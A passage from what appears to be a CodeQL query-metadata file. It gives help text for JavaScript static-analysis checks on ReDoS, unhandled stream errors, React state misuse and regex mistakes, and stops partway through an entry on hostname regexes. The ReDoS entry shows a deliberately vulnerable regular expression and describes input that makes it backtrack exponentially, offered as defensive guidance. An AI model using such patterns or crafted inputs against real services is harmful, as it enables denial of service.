      Some regular expressions take a long time to match certain input strings to the point where the time it takes to match a string of length *n* is proportional to *n<sup>k</sup>* or even *2<sup>n</sup>*. Such regular expressions can negatively affect performance, or even allow a malicious user to perform a Denial of Service ("DoS") attack by crafting an expensive input string for the regular expression to match.

      The regular expression engines provided by many popular JavaScript platforms use backtracking non-deterministic finite automata to implement regular expression matching. While this approach is space-efficient and allows supporting advanced features like capture groups, it is not time-efficient in general. The worst-case time complexity of such an automaton can be polynomial or even exponential, meaning that for strings of a certain shape, increasing the input length by ten characters may make the automaton about 1000 times slower.

      Typically, a regular expression is affected by this problem if it contains a repetition of the form `r*` or `r+` where the sub-expression `r` is ambiguous in the sense that it can match some string in multiple ways. More information about the precise circumstances can be found in the references.


      ## Recommendation
      Modify the regular expression to remove the ambiguity, or ensure that the strings matched with the regular expression are short enough that the time-complexity does not matter.


      ## Example
      Consider this regular expression:

      ```javascript

      /^_(__|.)+_$/
      ```
      Its sub-expression `"(__|.)+?"` can match the string `"__"` either by the first alternative `"__"` to the left of the `"|"` operator, or by two repetitions of the second alternative `"."` to the right. Thus, a string consisting of an odd number of underscores followed by some other character will cause the regular expression engine to run for an exponential amount of time before rejecting the input.

      This problem can be avoided by rewriting the regular expression to remove the ambiguity between the two branches of the alternative inside the repetition:

      ```javascript

      /^_(__|[^_])+_$/
      ```

      ## References
      * OWASP: [Regular expression Denial of Service - ReDoS](https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS).
      * Wikipedia: [ReDoS](https://en.wikipedia.org/wiki/ReDoS).
      * Wikipedia: [Time complexity](https://en.wikipedia.org/wiki/Time_complexity).
      * James Kirrage, Asiri Rathnayake, Hayo Thielecke: [Static Analysis for Regular Expression Denial-of-Service Attack](https://arxiv.org/abs/1301.0849).
      * Common Weakness Enumeration: [CWE-1333](https://cwe.mitre.org/data/definitions/1333.html).
      * Common Weakness Enumeration: [CWE-730](https://cwe.mitre.org/data/definitions/730.html).
      * Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Quality/UnhandledErrorInStreamPipeline.ql
    relativeBqrsPath: codeql/javascript-queries/Quality/UnhandledErrorInStreamPipeline.bqrs
    metadata:
      id: js/unhandled-error-in-stream-pipeline
      name: Unhandled error in stream pipeline
      description:
        Calling `pipe()` on a stream without error handling will drop errors
        coming from the input stream
      kind: problem
      problem.severity: warning
      precision: high
      tags: |-
        quality
               reliability
               error-handling
               frameworks/nodejs
    queryHelp: |
      # Unhandled error in stream pipeline
      In Node.js, calling the `pipe()` method on a stream without proper error handling can lead to unexplained failures, where errors are dropped and not propagated downstream. This can result in unwanted behavior and make debugging difficult. To reliably handle all errors, every stream in the pipeline must have an error handler registered.


      ## Recommendation
      Instead of using `pipe()` with manual error handling, prefer using the `pipeline` function from the Node.js `stream` module. The `pipeline` function automatically handles errors and ensures proper cleanup of resources. This approach is more robust and eliminates the risk of forgetting to handle errors.

      If you must use `pipe()`, always attach an error handler to the source stream using methods like `on('error', handler)` to ensure that any errors emitted by the input stream are properly handled. When multiple `pipe()` calls are chained, an error handler should be attached before each step of the pipeline.


      ## Example
      The following code snippet demonstrates a problematic usage of the `pipe()` method without error handling:


      ```javascript
      const fs = require('fs');
      const source = fs.createReadStream('source.txt');
      const destination = fs.createWriteStream('destination.txt');

      // Bad: Only destination has error handling, source errors are unhandled
      source.pipe(destination).on('error', (err) => {
        console.error('Destination error:', err);
      });

      ```
      A better approach is to use the `pipeline` function, which automatically handles errors:


      ```javascript
      const { pipeline } = require('stream');
      const fs = require('fs');
      const source = fs.createReadStream('source.txt');
      const destination = fs.createWriteStream('destination.txt');

      // Good: Using pipeline for automatic error handling
      pipeline(
        source,
        destination,
        (err) => {
          if (err) {
            console.error('Pipeline failed:', err);
          } else {
            console.log('Pipeline succeeded');
          }
        }
      );

      ```
      Alternatively, if you need to use `pipe()`, make sure to add error handling:


      ```javascript
      const fs = require('fs');
      const source = fs.createReadStream('source.txt');
      const destination = fs.createWriteStream('destination.txt');

      // Alternative Good: Manual error handling with pipe()
      source.on('error', (err) => {
        console.error('Source stream error:', err);
        destination.destroy(err);
      });

      destination.on('error', (err) => {
        console.error('Destination stream error:', err);
        source.destroy(err);
      });

      source.pipe(destination);

      ```

      ## References
      * Node.js Documentation: [stream.pipeline()](https://nodejs.org/api/stream.html#streampipelinestreams-callback).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: React/DirectStateMutation.ql
    relativeBqrsPath: codeql/javascript-queries/React/DirectStateMutation.bqrs
    metadata:
      name: Direct state mutation
      description: |-
        Mutating the state of a React component directly may lead to
                      lost updates.
      kind: problem
      problem.severity: warning
      id: js/react/direct-state-mutation
      tags: |-
        quality
               reliability
               correctness
               frameworks/react
      precision: very-high
    queryHelp: |
      # Direct state mutation
      React components have a `state` property. This property contains data associated with the component that may change over time. Although properties of the state object can be read freely, they should not be updated directly, since such modifications could be overwritten by asynchronous updates performed by `setState`.


      ## Recommendation
      Rewrite the code to use `setState` instead.


      ## Example
      The following example component uses `setInterval` to register method `tick` as a callback that is invoked every second and updates `state.now` directly:

      ```javascript

      class Clock extends React.Component {
        componentDidMount() {
          setInterval(() => this.tick(), 1000);
        }
        tick() {
          this.state.now = Date.now();
        }
      }

      ```
      Instead, `setState` should be used:

      ```javascript

      class Clock extends React.Component {
        componentDidMount() {
          setInterval(() => this.tick(), 1000);
        }
        tick() {
          this.setState({ now: Date.now() });
        }
      }

      ```

      ## References
      * React Quick Start: [State and Lifecycle](https://facebook.github.io/react/docs/state-and-lifecycle.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: React/InconsistentStateUpdate.ql
    relativeBqrsPath: codeql/javascript-queries/React/InconsistentStateUpdate.bqrs
    metadata:
      name: Potentially inconsistent state update
      description: |-
        Updating the state of a component based on the current value of
                      'this.state' or 'this.props' may lead to inconsistent component
                      state.
      kind: problem
      problem.severity: warning
      id: js/react/inconsistent-state-update
      tags: |-
        quality
               reliability
               correctness
               frameworks/react
      precision: very-high
    queryHelp: |
      # Potentially inconsistent state update
      React component state updates using `setState` may asynchronously update `this.props` and `this.state`, thus it is not safe to use either of the two when calculating the new state passed to `setState`.


      ## Recommendation
      Use the callback-based variant of `setState`: instead of calculating the new state directly and passing it to `setState`, pass a callback function that calculates the new state when the update is about to be performed.


      ## Example
      The following example uses `setState` to update the `counter` property of `this.state`, relying on the current (potentially stale) value of that property:

      ```javascript

      this.setState({
        counter: this.state.counter + 1
      });

      ```
      Instead, the callback form of `setState` should be used:

      ```javascript

      this.setState(prevState => ({
        counter: prevState.counter + 1
      }));

      ```

      ## References
      * React Quick Start: [State and Lifecycle](https://facebook.github.io/react/docs/state-and-lifecycle.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: React/UnsupportedStateUpdateInLifecycleMethod.ql
    relativeBqrsPath: codeql/javascript-queries/React/UnsupportedStateUpdateInLifecycleMethod.bqrs
    metadata:
      name: Unsupported state update in lifecycle method
      description:
        Attempting to update the state of a React component at the wrong
        time can cause undesired behavior.
      kind: problem
      problem.severity: warning
      id: js/react/unsupported-state-update-in-lifecycle-method
      tags: |-
        quality
               reliability
               correctness
               frameworks/react
      precision: high
    queryHelp: |
      # Unsupported state update in lifecycle method
      The three builtin React component methods `setState`, `replaceState`, and `forceUpdate` can update the state of a component asynchronously. It is, however, not recommended to invoke these methods at certain points in the lifecycle of the component.

      For instance, invoking one of the state update methods during a call to `render` will cause React to throw an exception because the `render` method must be pure. Invoking one of the state update methods from the constructor of a component is also forbidden because the component is not mounted at that point in time. The three component methods `componentDidUpdate`, `componentWillUpdate`, and `shouldComponentUpdate` do allow calls to the state update methods, but only if the calls are conditional.


      ## Recommendation
      Only invoke a state update method on a React component when its lifecycle allows it.


      ## Example
      The following example uses `setState` to update the `counter` property of `this.state`, from the constructor of a React component:


      ```javascript
      class MyComponent extends React.Component {

          constructor(props) {
              super(props)
              this.setState({
                  counter: 0
              })

          }

          render() {
              return <div>{this.state.counter}</div>
          }

      }

      ```
      Instead, replace the call to `setState` with an assignment:


      ```javascript
      class MyComponent extends React.Component {

          constructor(props) {
              super(props)
              this.state.counter = 0;
          }

          render() {
              return <div>{this.state.counter}</div>
          }

      }

      ```

      ## References
      * React reference: [React.Component](https://reactjs.org/docs/react-component.html).
      * React Quick Start: [State and Lifecycle](https://reactjs.org/docs/state-and-lifecycle.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: React/UnusedOrUndefinedStateProperty.ql
    relativeBqrsPath: codeql/javascript-queries/React/UnusedOrUndefinedStateProperty.bqrs
    metadata:
      name: Unused or undefined state property
      description:
        Unused or undefined component state properties may be a symptom of
        a bug and should be examined carefully.
      kind: problem
      problem.severity: warning
      id: js/react/unused-or-undefined-state-property
      tags: |-
        quality
               reliability
               correctness
               frameworks/react
      precision: high
    queryHelp: |
      # Unused or undefined state property
      Unused or undefined React component state properties can cause errors or make code hard to read and understand. Any computation used to initialize an unused state property is wasted, which may lead to performance problems. Any access to an undefined component state property trivially evaluates to the value `undefined`, which may come as a surprise.


      ## Recommendation
      Remove unused component state properties. Assign values to undefined component state properties.


      ## Example
      In the code below, the React component `Clock` attempts to display the current time in the `render` method.


      ```javascript
      class Clock extends React.Component {
          constructor(props) {
              super(props);
              this.state = { };
          }

          render() {
               // BAD: this.state.date is undefined
              var now = this.state.date.toLocaleTimeString();
              return (
                      <div>
                      <h2>The time is {now}.</h2>
                      </div>
              );
          }
      }

      ```
      But since there are no assignments to `this.state.date`, the `render` method will throw an exception when attempting to access the property `toLocaleString` of the value `undefined`. To avoid this exception, assign the `date` property before using it:


      ```javascript
      class Clock extends React.Component {
          constructor(props) {
              super(props);
              this.state = { date: new Date() };
          }

          render() {
               // GOOD: this.state.date is defined above
              var now = this.state.date.toLocaleTimeString()
              return (
                      <div>
                      <h2>The time is {now}.</h2>
                      </div>
              );
          }
      }

      ```

      ## References
      * React: [Component State](https://reactjs.org/docs/faq-state.html).
      * React: [State and Lifecycle](https://reactjs.org/docs/state-and-lifecycle.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: RegExp/BackrefBeforeGroup.ql
    relativeBqrsPath: codeql/javascript-queries/RegExp/BackrefBeforeGroup.bqrs
    metadata:
      name: Back reference precedes capture group
      description: |-
        If a back reference precedes the capture group it refers to, it matches the empty string,
                      which is probably not what was expected.
      kind: problem
      problem.severity: error
      id: js/regex/back-reference-before-group
      tags: |-
        quality
               reliability
               correctness
               regular-expressions
      precision: very-high
    queryHelp:
      "# Back reference precedes capture group\nBack references can be used\
      \ to refer back to the result of a previously matched capture group. It is syntactically\
      \ legal to refer to a capture group that has not finished matching yet, but such\
      \ a back reference always matches the empty string and is not very useful.\n\n\
      \n## Recommendation\nRemove the back reference if it is useless, or update it\
      \ to refer to the right capture group.\n\n\n## Example\nIn the following example,\
      \ the back reference `\\2` comes before the capture group `(.*)` it refers to.\
      \ (Note that the first group is non-capturing.)\n\n\n```javascript\nif (/(?:start|end)(\\\
      [*|\\{*)abc\\2:(.*)/.test(input))\n\tconsole.log(\"Found the pattern.\");\n```\n\
      Forward references like this can arise if a regular expression is updated inconsistently.\
      \ In this example, for instance, the first group may initially have been capturing\
      \ so the back reference referred to the group `(\\[*|\\{*])`. This group, however,\
      \ is now the first capturing group, so the back reference should be updated to\
      \ `\\1`.\n\n\n## References\n* Mozilla Developer Network: [JavaScript Regular\
      \ Expressions](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Regular_Expressions).\n"
  - pack: codeql/javascript-queries#0
    relativeQueryPath: RegExp/BackrefIntoNegativeLookahead.ql
    relativeBqrsPath: codeql/javascript-queries/RegExp/BackrefIntoNegativeLookahead.bqrs
    metadata:
      name: Back reference into negative lookahead assertion
      description: |-
        If a back reference refers to a capture group inside a preceding negative lookahead assertion,
                      then the back reference always matches the empty string, which probably indicates a mistake.
      kind: problem
      problem.severity: error
      id: js/regex/back-reference-to-negative-lookahead
      tags: |-
        quality
               reliability
               correctness
               regular-expressions
      precision: very-high
    queryHelp: |
      # Back reference into negative lookahead assertion
      Back references can be used to refer to the result of a previously matched capture group. It is syntactically legal to refer from outside a negative lookahead assertion to a capture group nested inside that assertion, but since the regular expression can only match when the body of the negative lookahead assertion did *not* match, such a back reference always matches the empty string. This probably indicates a mistake.


      ## Recommendation
      Remove the back reference if it is useless, or fix the regular expression to make sure the reference refers to the intended capture group.


      ## Example
      In the following example, the back reference `\2` refers to the capture group `(a+)` inside the negative lookahead assertion `(?!(a+)b)`.


      ```javascript
      /(.*?)a(?:d*)a(?!(a+)b)\2(.*)/;
      ```
      Useless back references like this can arise if a regular expression is updated inconsistently. In this example, for instance, the group `(?:d*)` may initially have been capturing, so the back reference `\2` would have referred to it instead of the capture group inside the negative lookahead assertion. If this is the case, the group `(?:d*)` should be made capturing again, that is, it should be replaced by `(d*)`.

      Note that referring to a capture group from within the same negative lookahead assertion is unproblematic.


      ## References
      * Ecma International, *ECMAScript Language Definition*, 5.1 Edition, Section 15.10.2.8. ECMA, 2011.
  - pack: codeql/javascript-queries#0
    relativeQueryPath: RegExp/BackspaceEscape.ql
    relativeBqrsPath: codeql/javascript-queries/RegExp/BackspaceEscape.bqrs
    metadata:
      name: Backspace escape in regular expression
      description: |-
        Using '\b' to escape the backspace character in a regular expression is confusing
                      since it could be mistaken for a word boundary assertion.
      kind: problem
      problem.severity: recommendation
      id: js/regex/backspace-escape
      tags: |-
        maintainability
               readability
               regular-expressions
      precision: medium
    queryHelp:
      "# Backspace escape in regular expression\nThe meaning of the `\\b` escape\
      \ sequence inside a regular expression depends on its syntactic context: inside\
      \ a character class, it matches the backspace character; outside of a character\
      \ class, it matches a word boundary. This context dependency makes regular expressions\
      \ hard to read, so the `\\b` escape sequence should not be used inside character\
      \ classes.\n\n\n## Recommendation\nReplace `\\b` in character classes with the\
      \ semantically identical escape sequence `\\x08`.\n\n\n## Example\nIn the following\
      \ example, the regular expression contains two uses of `\\b`: in the first case,\
      \ it matches a word boundary, in the second case it matches a backspace character.\n\
      \n\n```javascript\nif (/\\b[\\t\\b]/.test(input))\n\tconsole.log(\"Found word\
      \ boundary followed by tab or backspace\");\n```\nTo avoid mistaking the backspace\
      \ character for the word boundary metacharacter, rewrite the regular expression\
      \ as `/\\b[\\t\\x08]/`.\n\n\n## References\n* Mozilla Developer Network: [JavaScript\
      \ Regular Expressions](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Regular_Expressions).\n"
  - pack: codeql/javascript-queries#0
    relativeQueryPath: RegExp/DuplicateCharacterInCharacterClass.ql
    relativeBqrsPath: codeql/javascript-queries/RegExp/DuplicateCharacterInCharacterClass.bqrs
    metadata:
      name: Duplicate character in character class
      description: |-
        If a character class in a regular expression contains the same character twice, this may
                      indicate a bug.
      kind: problem
      problem.severity: warning
      id: js/regex/duplicate-in-character-class
      tags: |-
        quality
               reliability
               correctness
               regular-expressions
      precision: very-high
    queryHelp:
      "# Duplicate character in character class\nCharacter classes in regular\
      \ expressions (denoted by square brackets `[]`) represent sets of characters where\
      \ the pattern matches any single character from that set. Since character classes\
      \ are sets, specifying the same character multiple times is redundant and often\
      \ indicates a programming error.\n\nCommon mistakes include:\n\n* Using square\
      \ brackets `[]` instead of parentheses `()` for grouping alternatives\n* Misunderstanding\
      \ that special regex characters like `|`, `*`, `+`, `()`, and `-` work differently\
      \ when appearing inside a character class\n* Accidentally duplicating characters\
      \ or escape sequences that represent the same character\n\n## Recommendation\n\
      Examine each duplicate character to determine the intended behavior:\n\n* If you\
      \ see `|` inside square brackets (e.g., `[a|b|c]`): This is usually a mistake.\
      \ The author likely intended alternation. Replace the character class with a group:\
      \ `(a|b|c)`\n* If trying to match alternative strings, use parentheses `()` for\
      \ grouping instead of square brackets\n* If the duplicate was truly accidental,\
      \ remove the redundant characters\n* If trying to use special regex operators\
      \ inside square brackets, note that most operators (like `|`) are treated as literal\
      \ characters\nNote that simply removing `|` characters from character classes\
      \ is rarely the correct fix. Instead, analyze the pattern to understand what the\
      \ author intended to match.\n\n\n## Example\n**Example 1: Confusing character\
      \ classes with groups**\n\nThe pattern `[password|pwd]` does not match \"password\"\
      \ or \"pwd\" as intended. Instead, it matches any single character from the set\
      \ `{p, a, s, w, o, r, d, |}`. Note that `|` has no special meaning inside character\
      \ classes.\n\n\n```javascript\nif (/[password|pwd] =/.test(input))\n\tconsole.log(\"\
      Found password!\");\n```\nTo fix this problem, the regular expression should be\
      \ rewritten to `/(password|pwd) =/`.\n\n**Example 2: CSS unit matching**\n\nThe\
      \ pattern `r?e[m|x]` appears to be trying to match \"rem\" or \"rex\", but actually\
      \ matches \"re\" followed by any of the characters `{m, |, x}`. The correct pattern\
      \ should be `r?e(m|x)` or `r?e[mx]`.\n\nSimilarly, `v[h|w|min|max]` should be\
      \ `v(h|w|min|max)` to properly match \"vh\", \"vw\", \"vmin\", or \"vmax\".\n\n\
      \n## References\n* Mozilla Developer Network: [JavaScript Regular Expressions](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Regular_Expressions).\n\
      * MDN: [Character Classes](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Regular_Expressions/Character_Classes)\
      \ - Details on how character classes work.\n* MDN: [Groups and Ranges](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Regular_Expressions/Groups_and_Ranges)\
      \ - Proper use of grouping with parentheses.\n"
  - pack: codeql/javascript-queries#0
    relativeQueryPath: RegExp/EmptyCharacterClass.ql
    relativeBqrsPath: codeql/javascript-queries/RegExp/EmptyCharacterClass.bqrs
    metadata:
      name: Empty character class
      description:
        Empty character classes are not normally useful and may indicate
        a bug.
      kind: problem
      problem.severity: warning
      id: js/regex/empty-character-class
      tags: |-
        quality
               reliability
               correctness
               regular-expressions
      precision: very-high
    queryHelp:
      "# Empty character class\nAn empty character class in a regular expression\
      \ does not match anything and may indicate missing code.\n\n\n## Recommendation\n\
      Omit the empty character class. If the whole regular expression would become empty,\
      \ use `/(?:)/` to express a deliberately empty regular expression.\n\n\n## Example\n\
      In the following example, the programmer presumably meant to write a regular expression\
      \ that matches an opening square bracket or curly brace, followed by one or more\
      \ letters or digits, followed by a closing square bracket or curly brace. However,\
      \ they forgot to escape the closing square bracket with a backslash, leading to\
      \ an empty character class. The resulting regular expression is malformed and\
      \ could be interpreted differently on different platforms.\n\n\n```javascript\n\
      if (!/[[{]\\w+[]}]/.test(input))\n\tconsole.log(\"Malformed input.\");\n```\n\
      To fix this problem, the regular expression should be rewritten to `/[[{]\\w+[\\\
      ]}]/`.\n\n\n## References\n* Mozilla Developer Network: [JavaScript Regular Expressions](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Regular_Expressions).\n"
  - pack: codeql/javascript-queries#0
    relativeQueryPath: RegExp/IdentityReplacement.ql
    relativeBqrsPath: codeql/javascript-queries/RegExp/IdentityReplacement.bqrs
    metadata:
      name: Replacement of a substring with itself
      description:
        Replacing a substring with itself has no effect and may indicate
        a mistake.
      kind: problem
      problem.severity: warning
      security-severity: 5.0
      id: js/identity-replacement
      precision: very-high
      tags: |-
        correctness
               security
               external/cwe/cwe-116
    queryHelp: |
      # Replacement of a substring with itself
      Replacing a substring with itself has no effect and usually indicates a mistake, such as misspelling a backslash escape.


      ## Recommendation
      Examine the string replacement to find and correct any typos.


      ## Example
      The following code snippet attempts to backslash-escape all double quotes in `raw` by replacing all instances of `"` with `\"`:


      ```javascript
      var escaped = raw.replace(/"/g, '\"');

      ```
      However, the replacement string `'\"'` is actually the same as `'"'`, with `\"` interpreted as an identity escape, so the replacement does nothing. Instead, the replacement string should be `'\\"'`:


      ```javascript
      var escaped = raw.replace(/"/g, '\\"');

      ```

      ## References
      * Mozilla Developer Network: [String escape notation](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String#Escape_notation).
      * Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: RegExp/MalformedRegExp.ql
    relativeBqrsPath: codeql/javascript-queries/RegExp/MalformedRegExp.bqrs
    metadata:
      name: Malformed regular expression
      description: |-
        Regular expressions that do not adhere to the ECMAScript standard may be interpreted
                      differently across platforms and should be avoided.
      kind: problem
      problem.severity: recommendation
      id: js/regex/syntax-error
      tags: |-
        portability
               maintainability
               regular-expressions
      precision: low
    queryHelp:
      "# Malformed regular expression\nA syntactically ill-formed regular expression\
      \ may be interpreted differently on different platforms and may even lead to a\
      \ runtime error.\n\n\n## Recommendation\nExamine the regular expression to see\
      \ whether it contains any typos and correct them.\n\n\n## Example\nIn the following\
      \ example, the regular expression `p{` is not well-formed: `{` begins a range\
      \ quantifier of the form `{n,m}` specifying that the previous character is repeated\
      \ between `n` and `m` times, but here it is not followed by anything. Most browsers\
      \ will interpret this pattern as matching the literal string `\"p{\"`, but this\
      \ is not guaranteed by the ECMAScript standard.\n\n\n```javascript\nif (!/p{/.test(input))\n\
      \tconsole.log(\"Found it.\");\n```\nTo ensure portability, the opening curly brace\
      \ should be escaped like this: `/p\\{/`.\n\n\n## References\n* Mozilla Developer\
      \ Network: [JavaScript Regular Expressions](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Regular_Expressions).\n"
  - pack: codeql/javascript-queries#0
    relativeQueryPath: RegExp/RegExpAlwaysMatches.ql
    relativeBqrsPath: codeql/javascript-queries/RegExp/RegExpAlwaysMatches.bqrs
    metadata:
      name: Regular expression always matches
      description:
        Regular expression tests that always find a match indicate dead code
        or a logic error
      kind: problem
      problem.severity: warning
      id: js/regex/always-matches
      tags: |-
        quality
               reliability
               correctness
               regular-expressions
      precision: high
    queryHelp: |
      # Regular expression always matches
      There are several built-in JavaScript functions that search for a regular expression match within a string, such as `RegExp.prototype.test` and `String.prototype.search`. If the regular expression is not anchored, it only needs to match a substring of the input and won't necessarily match the whole string.

      If the regular expression being searched for accepts the empty string, this means it can match an empty substring anywhere in the input string, and will thus always find a match. In this case, testing if a match exists is redundant and indicates dead code.


      ## Recommendation
      Examine the regular expression and determine how it was intended to match:

      * To match the whole input string, add anchors at the beginning and end of the regular expression.
      * To search for an occurrence within the input string, consider what the shortest meaningful match is and restrict the regular expression accordingly, such as by changing a `*` to a `+`.

      ## Example
      In the following example, a regular expression is used to check the format of a string `id`. However, the check always passes because the regular expression can match the empty substring. For example, it will allow the ID string "`%%`" by matching an empty string at index 0.


      ```javascript
      if (!/[a-z0-9]*/.test(id)) {
          throw new Error("Invalid id: " + id);
      }

      ```
      To ensure the regular expression matches the whole string, add anchors at the beginning and end:


      ```javascript
      if (!/^[a-z0-9]*$/.test(id)) {
          throw new Error("Invalid id: " + id);
      }

      ```

      ## References
      * Mozilla Developer Network: [JavaScript Regular Expressions](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Regular_Expressions).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: RegExp/UnboundBackref.ql
    relativeBqrsPath: codeql/javascript-queries/RegExp/UnboundBackref.bqrs
    metadata:
      name: Unbound back reference
      description: |-
        Regular expression escape sequences of the form '\n', where 'n' is a positive number
                      greater than the number of capture groups in the regular expression, are not allowed
                      by the ECMAScript standard.
      kind: problem
      problem.severity: warning
      id: js/regex/unbound-back-reference
      tags: |-
        quality
               reliability
               correctness
               regular-expressions
      precision: very-high
    queryHelp: |
      # Unbound back reference
      In regular expressions, back references can be used to refer back to the result of a previously matched capture group. The ECMAScript standard forbids back references of the form '\\n', where 'n' is a positive number greater than the number of capture groups in the regular expression.

      While many browsers allow such references and interpret them as normal character escapes instead, this behavior is non-standard and should not be relied on. It can also be a source of bugs if the regular expression is changed later on, since the character escape may then start matching newly introduced capture groups.


      ## Recommendation
      If the back reference is meant to refer to a capture group, ensure that there is a capture group with the right number. If it is meant to be an escape sequence, convert it to a hexadecimal character escape, which is ECMAScript-compliant.


      ## Example
      In the following example, the back reference `\1` presumably is meant to refer to the string matched by the group `(?:\s+)`. However, that group is non-capturing.


      ```javascript
      /^(?:\s+)\w+\1$/;

      ```
      To fix this, convert the group into a capturing group `(\s+)`.

      If `\1` is actually meant to match the character with character code 1, it should be rewritten into the hexadecimal character escape `\x01`.


      ## References
      * Ecma International, *ECMAScript Language Definition*, 5.1 Edition, Section 15. ECMA, 2011.
      * Mozilla Developer Network: [JavaScript Regular Expressions](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Regular_Expressions).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: RegExp/UnmatchableCaret.ql
    relativeBqrsPath: codeql/javascript-queries/RegExp/UnmatchableCaret.bqrs
    metadata:
      name: Unmatchable caret in regular expression
      description: |-
        If a caret assertion '^' appears in a regular expression after another term that
                      cannot match the empty string, then this assertion can never match, so the entire
                      regular expression cannot match any string.
      kind: problem
      problem.severity: error
      id: js/regex/unmatchable-caret
      tags: |-
        quality
               reliability
               correctness
               regular-expressions
               external/cwe/cwe-561
      precision: very-high
    queryHelp:
      "# Unmatchable caret in regular expression\nThe caret character `^` in\
      \ a regular expression only matches at the beginning of the input, or (for multi-line\
      \ regular expressions) at the beginning of a line. If it is preceded by a pattern\
      \ that must match a non-empty sequence of (non-newline) input characters, it cannot\
      \ possibly match, rendering the entire regular expression unmatchable.\n\n\n##\
      \ Recommendation\nExamine the regular expression to find and correct any typos.\n\
      \n\n## Example\nIn the following example, the regular expression `/\\[^.]*\\.css/`\
      \ cannot match any string, since it contains a caret assertion preceded by an\
      \ escape sequence that matches an opening bracket.\n\n\n```javascript\nif (file.match(/\\\
      [^.]*\\.css/))\n\tconsole.log(\"Found it.\");\n```\n\n## References\n* Mozilla\
      \ Developer Network: [JavaScript Regular Expressions](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Regular_Expressions).\n\
      * Common Weakness Enumeration: [CWE-561](https://cwe.mitre.org/data/definitions/561.html).\n"
  - pack: codeql/javascript-queries#0
    relativeQueryPath: RegExp/UnmatchableDollar.ql
    relativeBqrsPath: codeql/javascript-queries/RegExp/UnmatchableDollar.bqrs
    metadata:
      name: Unmatchable dollar in regular expression
      description: |-
        If a dollar assertion '$' appears in a regular expression before another term that
                      cannot match the empty string, then this assertion can never match, so the entire
                      regular expression cannot match any string.
      kind: problem
      problem.severity: error
      id: js/regex/unmatchable-dollar
      tags: |-
        quality
               reliability
               correctness
               regular-expressions
               external/cwe/cwe-561
      precision: very-high
    queryHelp:
      "# Unmatchable dollar in regular expression\nThe dollar character `$`\
      \ in a regular expression only matches at the end of the input, or (for multi-line\
      \ regular expressions) at the end of a line. If it is followed by a pattern that\
      \ must match a non-empty sequence of (non-newline) input characters, it cannot\
      \ possibly match, rendering the entire regular expression unmatchable.\n\n\n##\
      \ Recommendation\nExamine the regular expression to find and correct any typos.\n\
      \n\n## Example\nIn the following example, the regular expression `/\\.\\(\\w+$\\\
      )/` cannot match any string, since it contains a dollar assertion followed by\
      \ an escape sequence that matches a closing parenthesis.\n\n\n```javascript\n\
      if (file.match(/\\.\\(\\w+$\\)/))\n\tconsole.log(\"Found it.\");\n```\n\n## References\n\
      * Mozilla Developer Network: [JavaScript Regular Expressions](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Regular_Expressions).\n\
      * Common Weakness Enumeration: [CWE-561](https://cwe.mitre.org/data/definitions/561.html).\n"
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Security/CWE-020/ExternalAPIsUsedWithUntrustedData.ql
    relativeBqrsPath: codeql/javascript-queries/Security/CWE-020/ExternalAPIsUsedWithUntrustedData.bqrs
    metadata:
      name: Frequency counts for external APIs that are used with untrusted data
      description: |-
        This reports the external APIs that are used with untrusted data, along with how
                      frequently the API is called, and how many unique sources of untrusted data flow
                      to it.
      id: js/count-untrusted-data-external-api
      kind: table
      tags: security external/cwe/cwe-020
    queryHelp: |
      # Frequency counts for external APIs that are used with untrusted data
      Using unsanitized untrusted data in an external API can cause a variety of security issues. This query reports all external APIs that are used with untrusted data, along with how frequently the API is used, and how many unique sources of untrusted data flow to this API. This query is designed primarily to help identify which APIs may be relevant for security analysis of this application.

      An external API is defined as a call to a function that is not defined in the source code, not overridden in the source code, and is not modeled as a taint step in the default taint library. External APIs may be from the third party dependencies or from internal dependencies. The query will report the external package name, followed by an access path leading to the function, followed by `[param x]` where `x` indicates the position of the parameter receiving the untrusted data.


      ## Recommendation
      For each result:

      * If the result highlights a known sink, no action is required.
      * If the result highlights an unknown sink for a problem, then add modeling for the sink to the relevant query.
      * If the result represents a call to an external API which transfers taint, add the appropriate modeling, and re-run the query to determine what new results have appeared due to this additional modeling.
      Otherwise, the result is likely uninteresting. Custom versions of this query can extend the `SafeExternalAPIMethod` class to exclude known safe external APIs from future analysis.


      ## Example
      If the query were to return the API `express().get.[callback].[param 'res'].send() [param 0]`, this could correspond to the `X` in `express().get('/foo', (req, res) => res.send(X))`. First we should consider whether this a security relevant sink. In this case, this is writing to a HTTP response, so we should consider whether this is an XSS sink. If it is, we should confirm that it is handled by the reflected XSS query.

      If the query were to return the API `url.parse java.lang.StringBuilder.append(java.lang.String) [param 0]`, then this should be reviewed as a possible taint step, because tainted data would flow from the 0th argument to the qualifier of the call.

      Note that both examples are correctly handled by the standard taint tracking library and XSS query.


      ## References
      * Common Weakness Enumeration: [CWE-20](https://cwe.mitre.org/data/definitions/20.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Security/CWE-020/IncompleteHostnameRegExp.ql
    relativeBqrsPath: codeql/javascript-queries/Security/CWE-020/IncompleteHostnameRegExp.bqrs
    metadata:
      name: Incomplete regular expression for hostnames
      description:
        Matching a URL or hostname against a regular expression that contains
        an unescaped dot as part of the hostname might match more hostnames than expected.
